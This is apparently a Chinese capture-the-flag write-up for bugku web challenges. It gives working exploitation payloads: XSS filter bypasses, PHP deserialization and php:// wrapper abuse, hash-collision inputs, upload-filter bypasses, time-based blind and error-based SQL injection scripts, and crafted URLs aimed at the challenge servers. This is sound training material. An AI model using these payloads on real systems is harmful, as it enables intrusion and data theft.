这里可以看到我的脚本用了两次base64，如果只用一次的话，题目会提示你需要再快点，具体的这里就不试了同时给出php的脚本:12345678910111213141516171819202122232425262728&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;?php $url = &quot;http://120.24.86.145:8002/web6/&quot;; $contents = file_get_contents($url); $header_arr = get_headers($url); $cookie = $header_arr[5]; $cookie = explode(&apos;:&apos;,$cookie)[1]; $cookie = explode(&apos;;&apos;,$cookie)[0]; $flag = $header_arr[9]; $flag = explode(&apos;:&apos;,$flag)[1]; $flag = base64_decode($flag); $flag = explode(&apos;: &apos;,$flag)[1]; $flag = base64_decode($flag); $post_data = array(&quot;margin&quot;=&gt;$flag); $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); curl_setopt($ch,CURLOPT_COOKIE,$cookie); curl_setopt($ch,CURLOPT_POSTFIELDS,$post_data); $output = curl_exec($ch); curl_close($ch); print_r($output);?&gt; cookies欺骗打开题目看到一堆乱码，但是URL栏看到那个filename，估计是个base64，解码之后果然： 但是前面还有个参数line，行的意思，一开始不知道这个参数有什么用，多试了几次：1http://120.24.86.145:8002/web11/index.php?line=0&amp;filename=a2V5cy50eHQ= 当line=0，1，2等数的时候，对应着文件的0，1，2行所以这个时候我们要做的是就是把index.php这个文件读到，首先将index.phpbase64转码：aW5kZXgucGhw然后写个脚本将line从0~40遍历一次，附上php脚本：12345678910111213141516&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;?php $url1 = &quot;http://120.24.86.145:8002/web11/index.php?line=&quot;; $url2 = &quot;&amp;filename=aW5kZXgucGhw&quot;; for ($i=0; $i &lt; 40; $i++) &#123; $url = $url1.$i.$url2; $contents = file_get_contents($url); echo $contents; echo &quot;&lt;br&gt;&quot;; &#125; ?&gt; python脚本：123456789# coding:utf8import requests url1 = &quot;http://120.24.86.145:8002/web11/index.php?line=&quot;url2 = &quot;&amp;filename=aW5kZXgucGhw&quot;;for i in range(40): url=url1+str(i)+url2 ans = requests.get(url) print(ans.text) 脚本运行之后得到的源码:123456789101112131415161718error_reporting(0); $file=base64_decode(isset($_GET[&apos;filename&apos;])?$_GET[&apos;filename&apos;]:&quot;&quot;); $line=isset($_GET[&apos;line&apos;])?intval($_GET[&apos;line&apos;]):0; if($file==&apos;&apos;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;); $file_list = array( &apos;0&apos; =&gt;&apos;keys.txt&apos;, &apos;1&apos; =&gt;&apos;index.php&apos;, ); if(isset($_COOKIE[&apos;margin&apos;]) &amp;&amp; $_COOKIE[&apos;margin&apos;]==&apos;margin&apos;)&#123; $file_list[2]=&apos;keys.php&apos;; &#125; if(in_array($file, $file_list))&#123; $fa = file($file); echo $fa[$line]; &#125; ?&gt; 看到源码之后，当存在cookie:margin且等于margin的时候，才能读keys.php的源码,拿bp改个包，并且将文件名参数发送为keys.php转码后的值发送即可得到flag: XSS注入题目提示必须包含alert(_key_)，所以先提交:1URL?id=&lt;script&gt;alert(_key_)&lt;/script&gt; 但是没有给出flag，查看源代码： 可以看到此时s里的内容&lt; &gt;已经被转义成了&amp;lt &amp;gt,所以如果要得到flag，必须先绕过过滤：Unicode编码绕过,查看原理 用\u003c和\u003e来代替&lt; &gt; 1URL?id=\u003cscript\u003e alert(_key_)\u003c/script\u003e 替换之后没有弹窗，但是在源代码里可以看到flag: 这题做了处理，不能用简单的alert来弹窗，但是也有其他方法，payload:1URL?id=\u003cimg%20src=1%20onerror=alert(_key_)\u003e; 得到flag never give up上来发现没什么提示，看了看源代码，提示了1p.html，访问之后。。。到了bugku的论坛，估计是有个跳转，直接拿bp抓包访问即可： 做到这就有种感觉了，这题纯粹是来坑人的,将中间那段代码先复制到记事本(待会方便改)，对编码熟悉一点的人应该都知道该怎么做了，base64转码:1JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ 为什么是这一段，因为base64里是不会出现百分号的，base64解码：附上链接解码之后：1%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E ctf做多了就知道，这又是一段URL编码，这个时候比较坑的一点是，你得把这段url编码放到之前的编码里再URL解码URL编码：附上链接解码之后：1234567891011121314151617181920212223242526var Words = &quot;&lt;script&gt;window.location.href=&apos;http://www.bugku.com&apos;;&lt;/script&gt; &lt;!--&quot;;if(!$_GET[&apos;id&apos;])&#123; header(&apos;Location: hello.php?id=1&apos;); exit();&#125;$id=$_GET[&apos;id&apos;];$a=$_GET[&apos;a&apos;];$b=$_GET[&apos;b&apos;];if(stripos($a,&apos;.&apos;))&#123; echo &apos;no no no no no no no&apos;; return ;&#125;$data = @file_get_contents($a,&apos;r&apos;);if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)&#123; require(&quot;f4l2a3g.txt&quot;);&#125;else&#123; print &quot;never never never give up !!!&quot;;&#125;?&gt;==--&gt;&quot; 直接看代码，访问f4l2a3g.txt得到flag: welcome to bugkuctf一开始题目没给什么提示，看了看源代码： 一道代码审计题，首先是需要存在user变量，并且user变量的值需要等于welcome to the bugkuctf，但是又不能直接提交txt等于welcome to the bugkuctf，因为用了file_get_contents，所以只能用php伪协议了,这里用到的是php://input： 访问请求的原始数据的只读流，可以接收到post的数据 可以看到已经绕过了file_get_contents，所以现在需要读到hint.php的源码，但是可以看到被包含了，但是被服务器解析了，所以现在需要php://filter： 将代码过滤成base64展现出来 解码出来之后: 12345678910111213&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;good&quot;); &#125; &#125; &#125; ?&gt; 是一个Flag类，里面是一个魔术方法tostring，官方文档: 1__toString() 方法用于一个类被当成字符串时应怎样回应。 大概意思就是当对象被当成了字符串时echo时，执行这个方法 再用同样的方法获取到index.php的源码 1234567891011121314151617181920&lt;?php $txt = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $password = $_GET[&quot;password&quot;]; if(isset($txt)&amp;&amp;(file_get_contents($txt,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;))&#123; echo &quot;hello friend!&lt;br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;不能现在就给你flag哦&quot;; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo &quot;you are not the number of bugku ! &quot;; &#125; ?&gt; 可以看到已经通过了第一个判断，接下来是需要绕过第二个判断，而且按照题目的解释，可以知道flag就在flag.php里，但是代码里匹配了flag，所以直接用伪协议读取flag.php是行不通的了，所以现在看到第三个参数，password,代码里有一个函unserialize(),对单一的已序列化的变量进行操作，将其转换回 PHP 的值。现在需要做的是将Flag类实例化，使flag.php文件能够成功包含本地代码： 1234567891011121314151617&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;good&quot;); &#125; &#125; &#125; $ff = new Flag;$ff-&gt;file = &apos;flag.php&apos;;echo serialize($ff);?&gt; 这段代码就是实例化了Flag类并且将其中的flie等于flag.php，并且序列化， 1O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 得到一个这样的序列串，将password等于这个串即可 最终的payload:1234http://120.24.86.145:8006/test1/?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;POST:welcome to the bugkuctf 这题把伪协议这块锻炼了一遍，是个很好的练习题 过狗一句话这题直接就扫到了flag.txt,应该是题目坏了 字符？正则？这题无非就是匹配一个正则，代码： 12345678&lt;?php highlight_file(&apos;2.php&apos;);$key=&apos;KEY&#123;********************************&#125;&apos;;$IM= preg_match(&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);if( $IM )&#123; die(&apos;key is: &apos;.$key);&#125;?&gt; 照着其中的表达式一步一步写就行了,不会正则的可以参考正则表达式,引用网上一位大佬写的 1234567891011表达式直接写出来的字符串直接利用，如key“.”代表任意字符“*”代表一个或一序列字符重复出现的次数，即前一个字符重复任意次，这里可以是0次，还有就是以’^’开头，以’$’结束“\/”代表“/”，一种转义，因为单独的//代表着正则的开始与结束[a-z]代表a-z中的任意一个字符[[:punct:]]代表任意一个字符，包括各种符号，记得是符号/i代表大小写不敏感&#123;4-7&#125;代表[0-9]中数字连续出现的次数是4-7次\s匹配任意的空白符\d 匹配数字\b 匹配单词的开始或结束 我的payload:1http://120.24.86.145:8002/web10/?id=keykkeykkkkkkey:/k/kkeyk, 前女友(SKCTF)一进题目就是PHP是世界上最好的语言,代码审计无误了看一下源代码，有一个跳转，得到了一段代码： 123456789101112&lt;?phpif(isset($_GET[&apos;v1&apos;]) &amp;&amp; isset($_GET[&apos;v2&apos;]) &amp;&amp; isset($_GET[&apos;v3&apos;]))&#123; $v1 = $_GET[&apos;v1&apos;]; $v2 = $_GET[&apos;v2&apos;]; $v3 = $_GET[&apos;v3&apos;]; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; if(!strcmp($v3, $flag))&#123; echo $flag; &#125; &#125;&#125;?&gt; payload: 1http://118.89.219.210:49162/?v1[]=1&amp;v2[]=2&amp;v3[]=1 login1(SKCTF)题目首先给了提示:1hint:SQL约束攻击 CSDN上一篇文章讲的很好，参考链接,简单来说，这题就是先注册一个admin加很多空格如：1admin+++++++++++++++++++++++++++++++++++++++++++++ 此时数据库里插入的数据也是这个，但是在查询语句，也就是select语句中，字符串末尾的空格符将会被删除,就是刚刚注册的&#39;admin &#39;与&#39;admin&#39;一样，所以这题思路就出来了，注册一个admin后面跟上很多空格的用户，然后用正常使用admin登陆，密码填写刚刚注册使用的密码，直接登陆进管理员，得到flag 附上查询语句： 123&quot;SELECT username FROM users WHERE username=&apos;$username&apos; AND password=&apos;$password&apos; &quot; 你从哪里来这题很简单，将消息头改一下就行了： Web(2)点此链接]]></content>
      <categories>
        <category>writeup</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku writeup(Web2）]]></title>
    <url>%2F2018%2F06%2F06%2Fbugku2%2F</url>
    <content type="text"><![CDATA[Web(2)md5 collision(NUPT_CTF)题目提示md5，先试试弱类型比较的漏洞240610708 直接拿到flag,payload：1http://120.24.86.145:9009/md5.php?a=240610708 程序员本地网站题目提示1请从本地访问! 直接构造XFF,在消息头里加上1X-Forwarded-For:127.0.0.1 直接拿到flag 各种绕过题目直接给了源代码：12345678910111213141516171819&lt;?php highlight_file(&apos;flag.php&apos;); $_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]); $flag = &apos;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&apos;; if (isset($_GET[&apos;uname&apos;]) and isset($_POST[&apos;passwd&apos;])) &#123; if ($_GET[&apos;uname&apos;] == $_POST[&apos;passwd&apos;]) print &apos;passwd can not be uname.&apos;; else if (sha1($_GET[&apos;uname&apos;]) === sha1($_POST[&apos;passwd&apos;])&amp;($_GET[&apos;id&apos;]==&apos;margin&apos;)) die(&apos;Flag: &apos;.$flag); else print &apos;sorry!&apos;; &#125; ?&gt; 先解释一下代码，当uname`passwd存在，并且两个值不能相等，但是他们俩的sha1值必须相等，原则上是不可能实现的，所以漏洞就在这产生了， 这题看到了sha1()，跟md5()`不一样，所以需要SHA1碰撞，我引用了这篇文章的两个hax 第一个1%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1 第二个1%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1 有了这两个值之后就很好做了，代码本身并不难，记得最后跟上一个id=margin web8题目也是给了代码: 123456789101112131415&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));if ($ac === $f)&#123;echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;;&#125;else&#123;echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;;&#125;&#125;?&gt; 先解释一下代码，extract()可以将数组的键名拆成变量，这里直接像平时一样传参即可，并且必须存在$ac这个变量，然后$f这个变量是从file_get_contents($fn)中得到，所以你还需要传入$fn这个变量，如果$ac与$f相等的话，得到flag，但是这个相等绕过的可能性不大，因为是三个等号，所以只能将另这两个值相等了。 两种解法： 第一种 直接扫后台，扫到一个名为flag.txt，并且内容是flags然后根据代码的意思将传入的$ac参数值置为flags,然后将$fn置为flag.txt payload:1http://120.24.86.145:8002/web8/?ac=flags&amp;fn=flag.txt 第二种 利用伪协议，既然$fn可控的话，并且被包含，那么就能用伪协议了，payload: 123http://120.24.86.145:8002/web8/?ac=1&amp;fn=php://inputPOST:1 细心首先这题啥都没有，各种找都找不到入口，然后上御剑扫到了robots.txt 12User-agent: *Disallow: /resusl.php 有个提示是管理员的，提交x为各种值都不行，然后提交为admin有反应了？wtf? 求getshell首先题目提示：1My name is margin,give me a image file not a php 先上传个php试试， 直接提示了非法文件，然后我们将扩展名改为jpg试试 题目会提示1You got it!:) 能成功，但是题目没有回显路径或者flag,继续更改文件的类型为image/jpeg,然后回显了路径： 但是已经被当成一张图片了，服务器无法解析，所以上菜刀是连不上的，这个时候需要揣摩一下出题者的意图了，提示里写了需要一个image，所以类型是肯定需要改成image的，但是各种试都上传不上去，能成功上传的都被更改了后缀名,所以更改一下请求头的Content-Type大小写，因为这道题的waf很严格，导致了各种上传方式都失败，又因为对s上传的文件类型做了一点要求，所以只能更改后缀名来得到flag，php别名：1php2, php3, php4, php5, phps, pht, phtm, phtml … 都可以试一下，当试到php5时，得到flag: 这里引用网上wp的一句话：123如果是waf严格匹配，通过修改Content-type后字母的大小写可以绕过检测，使得需要上传的文件可以到达服务器端，而服务器的容错率较高，一般我们上传的文件可以解析。 INSERT INTO注入题目提示：不如写个python吧。。估计大概率是盲注了，先放上代码:123456789101112131415161718192021222324252627error_reporting(0);function getIp()&#123;$ip = &apos;&apos;;if(isset($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]))&#123;$ip = $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;];&#125;else&#123;$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];&#125;$ip_arr = explode(&apos;,&apos;, $ip);return $ip_arr[0];&#125;$host=&quot;localhost&quot;;$user=&quot;&quot;;$pass=&quot;&quot;;$db=&quot;&quot;;$connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);mysql_select_db($db) or die(&quot;Unable to select database&quot;);$ip = getIp();echo &apos;your ip is :&apos;.$ip;$sql=&quot;insert into client_ip (ip) values (&apos;$ip&apos;)&quot;;mysql_query($sql); 分析一下代码，这段代码的意思先从$_SERVER[&#39;HTTP_X_FORWARDED_FOR获得ip变量，然后再执行insert into语句，所以这里的可控变量是$ip，也就是在请求包里构造XFF，在insert into注入中，需要用到的sql语句是1select case when 条件 then 执行1 else 执行2 再来看看代码过滤了什么:explode(&#39;,&#39;, $ip)可以发现逗号被过滤了，所以substr()1,1这样的方法行不通，所以现在需要换一种方法substr() from 1 for 1,而且因为没有报错，所以只能是基于时间的盲注，这时候需要用到sleep()和timeout,先上python代码：12345678910111213141516171819import requestsimport stringmystring = string.ascii_letters+string.digits+string.punctuationurl=&apos;http://120.24.86.145:8002/web15/&apos;data = &quot;&apos;+(select case when (substring((select database() ) from &#123;0&#125; for 1)=&apos;&#123;1&#125;&apos;) then sleep(5) else 1 end)) #&quot;flag = &apos;&apos;for i in range(1,10): for j in mystring: try: headers = &#123;&apos;x-forwarded-for&apos;:data.format(str(i),j)&#125; res = requests.get(url,headers=headers,timeout=3) except requests.exceptions.ReadTimeout: flag += j print(flag) breakprint(&apos;The database name is &apos;+flag) 这段代码的作用是查出来数据库的名字，后面的步骤也就跟普通的盲注一样了，得到表名代码:12345678910111213141516171819202122import requestsimport stringmystring = string.ascii_letters+string.digits+string.punctuationurl=&apos;http://120.24.86.145:8002/web15/&apos;data = &quot;&apos;+(select case when (substring((select table_name from information_schema.tables where table_schema= &apos;web15&apos; limit 1 offset &#123;0&#125;) from &#123;1&#125; for 1)=&apos;&#123;2&#125;&apos;) then sleep(5) else 1 end)) #&quot;flag = &apos;&apos;tables = []for x in range(0,5): tables.append(flag) flag = &apos;&apos; for i in range(1,10): for j in mystring: try: headers = &#123;&apos;x-forwarded-for&apos;:data.format(str(x),str(i),j)&#125; res = requests.get(url,headers=headers,timeout=3) except requests.exceptions.ReadTimeout: flag += j print(flag) breakprint(&apos;The database name is &apos;+&apos;&apos;.join(tables)) 列名也是一样的道理，所以只放出最后的代码：12345678910111213141516171819import requestsimport stringmystring = string.ascii_letters+string.digits+string.punctuationurl=&apos;http://120.24.86.145:8002/web15/&apos;data = &quot;&apos;+(select case when (substring((select flag from flag) from &#123;0&#125; for 1)=&apos;&#123;1&#125;&apos;) then sleep(5) else 1 end)) #&quot;flag = &apos;&apos;for i in range(1,35): for j in mystring: try: headers = &#123;&apos;x-forwarded-for&apos;:data.format(str(i),j)&#125; res = requests.get(url,headers=headers,timeout=4) except requests.exceptions.ReadTimeout: flag += j print flag breakprint(flag) 最后可以得到flag 这是一个神奇的登陆框很基础的注入题，payload:11&quot; union select flag1,2 from flag1 # 多次首先各种试了之后全是error，在这样尝试之后发现没有报错：1http://120.24.86.145:9004/1ndex.php?id=1&apos; aandnd 1=1 %23 估计后面全是双写绕过，然后就变成了一个很普通的联合注入，所以最终的payload是1http://120.24.86.145:9004/1ndex.php?id=-1&apos; ununionion selselectect 1,flag1 from flag1%23 但是这个flag是一串乱码。。是第一个flag，在找列的时候还看到一个address列：1http://120.24.86.145:9004/1ndex.php?id=-1&apos; ununionion selselectect 1,address from flag1%23 可以得到下一关的通关地址Once_More.php 这一关双写union也没办法绕过，所以试了一下updatexml，报错注入，这里大概简述一下updatexml报错注入：12345UPDATEXML (XML_document, XPath_string, new_value); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 第三个参数：new_value，String格式，替换查找到的符合条件的数据 作用：改变文档中符合条件的节点的值 来看看这题的payload:1http://120.24.86.145:9004/Once_More.php?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23 concat函数会把中间的参数连接成字符串，比如:1concat(hello,world,!) 很容易理解，返回的是helloworld!，然后又因为UPDATEXML函数的第二个参数需要的是xml格式的字符串，我这里提交的是~sql语句~,是不符合xml格式的，所以会报错。得到表名： 按照这个思路，可以一步步的得到flag，什么时候能进行报错注入呢，输入这个语句查询sql版本：1?id=1&apos; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)%23 前面已经得到了表名，列名和数据直接放上payload:列：1http://120.24.86.145:9004/Once_More.php?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=0x666c616732),0x7e),1)%23 flag:1http://120.24.86.145:9004/Once_More.php?id=1&apos; and updatexml(1,concat(0x7e,(select flag2 from flag2),0x7e),1)%23 然后发现其实这题还有第三关:1http://120.24.86.145:9004/Once_More.php?id=1&apos; and updatexml(1,concat(0x7e,(select address from flag2),0x7e),1)%23 1http://120.24.86.145:9004/Have_Fun.php 访问之后查看源代码提示：12YOUR IP:59.46.211.135Sorry,Only IP:192.168.0.100 Can Access This Site 构造XFF即可绕过： 然后题目提示了一个图片，访问之后是个二维码扫描之后得到以下信息： 你……你……你可以看到我? 好吧，我来自于ErWeiMa.php 顺便告诉你两个密码 one:参数名是game; tow:flag在admin里 对了,文件后@…c=Y&amp;$as%_=#ad…@#！*&amp;@…c…… 参数名是game，flag在admin里，很明显的文件读取了，不能直接读取,所以只能用伪协议了：1game=php://filter/read=convert.base64-encode/resource=admin.php 得到源码之后,base64解码：12345&lt;?php$good = &quot;Good Jobï¼I want You!&quot;;$flag = &quot;0x476F6F64204A6F62A3A1492077616E7420596F7521A3A1&quot;;?&gt; 得到flag,提交时需要加上FLAG{} PHP_encrypt_1(ISCCCTF)这题一开始没给加密后的数据，应该是题目有问题，网上找了一下找到了，1fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA= 加密算法：12345678910111213141516171819function encrypt($data,$key)&#123; $key = md5(&apos;ISCC&apos;); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i=0; $i &lt; $len; $i++) &#123; if ($x == $klen) &#123; $x = 0; &#125; $char .= $key[$x]; $x+=1; &#125; for ($i=0; $i &lt; $len; $i++) &#123; $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); &#125; return base64_encode($str);&#125; 自用的解密算法：123456789101112131415161718192021function decrypt($str)&#123; $str = base64_decode($str); $len = strlen($str); $key = md5(&apos;ISCC&apos;); $klen = strlen($key); for ($i=0; $i &lt; $len; $i++) &#123; if ($x == $klen)&#123; $x = 0; &#125; $char .= $key[$x]; $x+=1; &#125; for ($i=0; $i&lt;$len ; $i++) &#123; if (abs(ord($str[$i])-ord($char[$i])+128)&gt;128) &#123; $flag .= chr(abs(ord($str[$i])-ord($char[$i]))); &#125;else&#123; $flag .= chr(abs(ord($str[$i])-ord($char[$i])+128)); &#125; &#125; return $flag;&#125; 这里有两个地方需要注意， 第一个是加密算法里的$char，长度不确定，但是想一想之后会发现，他的长度跟加密后的数据长度一样(base64之后) 第二个点是取余是不可逆的，但是由于ascii码的范围是有限的，所以其中的ord($data[$i]) + ord($char[$i])的范围是[0,254]，所以这个取余是可逆的，分成两种情况， 第一种是相加大于128 第二种是相加小于128 Flag:{asdqwdfasfdawfefqwdqwdadwqadawd} 文件包含2这题应该是坏了，自己试的方法和网上找的方法都行不通 flag.php首先这个login点了肯定是没反应的，因为根本没有action，所以看到hint,在URL后面传递一个hint参数，此时可以看到源码： 123456789101112131415161718192021222324252627282930313233343536http://120.24.86.145:8002/flagphp/?hint=&lt;?php error_reporting(0); include_once(&quot;flag.php&quot;); $cookie = $_COOKIE[&apos;ISecer&apos;]; if(isset($_GET[&apos;hint&apos;]))&#123; show_source(__FILE__); &#125; elseif (unserialize($cookie) === &quot;$KEY&quot;) &#123; echo &quot;$flag&quot;; &#125; else &#123; ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;title&gt;Login&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;br&gt; &lt;div class=&quot;container&quot; align=&quot;center&quot;&gt; &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt; &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php &#125; $KEY=&apos;ISecer:www.isecer.com&apos;; ?&gt; 分析一下这段代码，中间得到flag的代码是当unserialize($cookie)等于$key时，但是key是在后面定义的，所以前面那个key是空的，我们可以在本地试试1234567&lt;?php$str = &apos;s:0:&quot;&quot;;&apos;;if(unserialize($str) === &quot;$hh&quot;)&#123; echo 1;&#125;?&gt; 可以发现是会回显1的，所以一样的道理，在请求头中添加:1Cookie:ISecer=s:0:&quot;&quot;; 即可得到flag sql注入2说是sql注入，但是各种方法都试了，找了网上的writeup才发现是.DS_Store泄露，什么是.DS_Store:1.DS_Store 是 Mac OS X 系统中的临时文件，其中可能存放与目录相关的敏感信息。 在网上找一个.DS_Store利用工具 直接就把flag文件下载下来了，打开即可拿到flag 孙xx的博客这题貌似也坏了 报错注入题目给出提示:1234访问参数为：?id=x不允许包含“--”，空格，单引号，双引号，“union”关键字查询文件中包含“”（双引号）里面的内容，需要查询的文件路径为：/var/test/key_1.php 需要查询的是一个文件，这里使用mysql的load_file这个函数,题目很明显直接提示了是报错注入，先试试updatexml1http://103.238.227.13:10088/?id=1/**/and/**/updatexml(1,concat(0x7e,(select/**/@@version),0x7e),1) 